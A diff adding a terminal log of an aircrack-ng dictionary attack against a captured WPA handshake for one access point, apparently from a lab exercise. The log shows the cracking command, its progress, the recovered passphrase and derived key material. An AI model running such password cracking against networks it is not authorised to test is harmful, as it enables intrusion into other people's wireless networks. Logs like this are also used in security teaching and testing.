@@ -1,0 +1,23 @@
+[slaynpool@MiniZbeub]manip$ aircrack-ng -w dico.txt -b 24:0a:c4:11:03:11 ap1.pcap 
+Reading packets, please wait...
+Opening ap1.pcap
+Read 707 packets.
+1 potential targets
+                         Aircrack-ng 1.6 rev e708c21e
+
+      [00:01:55] 1018600/1814400 keys tested (8948.72 k/s) 
+
+      Time left: 1 minute, 28 seconds                           56.14%
+
+                           KEY FOUND! [ 54921037 ]
+
+
+      Master Key     : A0 95 76 12 96 52 BD 1A 28 B3 65 97 81 8F F8 D7 
+                       8A CB 87 74 93 ED F5 92 B1 C8 E9 5A 99 D5 D4 98 
+
+      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+      EAPOL HMAC     : 09 3F 16 D3 78 C3 11 A6 E0 A1 5D 6B B2 B8 45 15 
